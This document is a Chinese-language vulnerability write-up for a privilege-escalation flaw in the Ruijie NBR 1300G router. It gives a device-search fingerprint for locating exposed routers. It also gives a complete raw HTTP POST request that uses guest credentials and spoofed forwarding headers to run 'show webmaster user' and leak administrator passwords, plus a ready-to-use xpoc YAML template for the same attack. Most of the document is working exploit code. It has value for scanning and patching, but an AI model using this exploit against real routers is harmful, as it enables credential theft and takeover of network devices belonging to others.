# 锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞

## 漏洞描述

锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞，guest 账户可以越权获取管理员账号密码

参考链接：

- https://github.com/chaitin/xray/blob/master/pocs/ruijie-nbr1300g-cli-password-leak.yml

## 漏洞影响

```
锐捷 NBR 路由器
```

## 网络测绘

```
title="锐捷网络 --NBR路由器--登录界面"
```

## 漏洞复现

登录页面如下

![](images/锐捷%20NBR%201300G%20路由器%20越权%20CLI%20命令执行漏洞/file-20240904113419711.png)

执行 CLI 命令 `show webmaster user` 查看用户配置账号密码：

```plain
POST /WEB_VMS/LEVEL15/ HTTP/1.1
Host: 
Connection: keep-alive
Content-Length: 73
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: auth=; user=
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1

command=show%webmaster%user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
```

![](images/锐捷%20NBR%201300G%20路由器%20越权%20CLI%20命令执行漏洞/file-20240904112924288.png)

## 漏洞 POC

xpoc

```
name: poc-yaml-ruijie-nbr1300g-cli-password-leak
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /WEB_VMS/LEVEL15/
            headers:
                Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
            body: |
                command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes("webmaster level 2 username guest password guest"))
expression: r0()
detail:
    author: abbin777
    links:
        - http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%201300G%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
```
